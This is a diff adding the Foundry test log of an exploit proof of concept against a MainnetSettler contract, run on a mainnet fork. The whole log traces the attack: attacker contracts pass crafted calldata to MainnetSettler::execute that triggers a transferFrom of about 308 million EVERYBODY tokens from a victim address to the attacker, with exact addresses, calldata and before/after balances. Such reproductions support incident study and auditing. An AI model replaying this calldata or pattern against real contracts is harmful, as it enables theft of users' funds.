@@ -1,0 +1,44 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MainnetSettler_exp.sol:ContractTest
+[PASS] testPoC() (gas: 174891)
+Logs:
+  before attack: balance of attacker: 0.000000000000000000
+  after attack: balance of attacker: 308453642.481581939556432141
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 21230767 [2.123e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [179691] ContractTest::testPoC()
+    ├─ [2646] EVERYBODY::balanceOf(0x3A38877312D1125d2391663CBa9f7190953Bf2d9) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 0, decimals: 18)
+    ├─ [0] VM::startPrank(0x3A38877312D1125d2391663CBa9f7190953Bf2d9, 0x3A38877312D1125d2391663CBa9f7190953Bf2d9)
+    │   └─ ← [Return]
+    ├─ [130366] → new AttackerC@0x285D37b0480910f977CD43C9bd228527BfaD816E
+    │   ├─ [85254] → new AttackerCC@0x1cB9aF7b863e101bb9cf12C30a209C374834f53B
+    │   │   ├─ [65151] MainnetSettler::execute(Slippage({ recipient: 0x0000000000000000000000000000000000000000, buyToken: 0x0000000000000000000000000000000000000000, minAmountOut: 0 }), [0x38c9c1470000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000271000000000000000000000000068b36248477277865c64dfc78884ef80577078f3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000a31d98b1aa71a99565ec2564b81f834e90b1097b0000000000000000000000003a38877312d1125d2391663cba9f7190953bf2d9000000000000000000000000000000000000000000ff259976e827cb6369390d], 0xe0b1db9e7c871328327e3f9e0000000000000000000000000000000000000000)
+    │   │   │   ├─ [62011] EVERYBODY::transferFrom(0xA31d98b1aA71a99565EC2564b81f834E90B1097b, 0x3A38877312D1125d2391663CBa9f7190953Bf2d9, 308453642481581939556432141 [3.084e26])
+    │   │   │   │   ├─ emit Transfer(from: 0xA31d98b1aA71a99565EC2564b81f834E90B1097b, to: 0x3A38877312D1125d2391663CBa9f7190953Bf2d9, value: 308453642481581939556432141 [3.084e26])
+    │   │   │   │   ├─ emit Approval(owner: 0xA31d98b1aA71a99565EC2564b81f834E90B1097b, spender: MainnetSettler: [0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710], value: 115792089237316195423570985008687907853269984665640255585815102425973573207794 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x4c1e888d697f9ce6c2f776988286cb129907b9af71cfbb09b88d47012a126581: 0x000000000000000000000000000000000000000000ff259976e827cb6369390d → 0
+    │   │   │   │   │   @ 0x92f9106f98749902e9822f108e7ff9f315fa229f9bb96cda1b0cb9ef26f26f79: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffff00da668917d8349c96c6f2
+    │   │   │   │   │   @ 0xd6a8139455445e937c53a11d100591a1cbeca65e371e3f90cf9d4fb4e6e668b2: 0 → 0x000000000000000000000000000000000000000000ff259976e827cb6369390d
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 62 bytes of code
+    │   └─ ← [Return] 62 bytes of code
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [646] EVERYBODY::balanceOf(0x3A38877312D1125d2391663CBa9f7190953Bf2d9) [staticcall]
+    │   └─ ← [Return] 308453642481581939556432141 [3.084e26]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 308453642481581939556432141 [3.084e26], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.03s (1.24ms CPU time)
+
+Ran 1 test suite in 2.45s (1.03s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
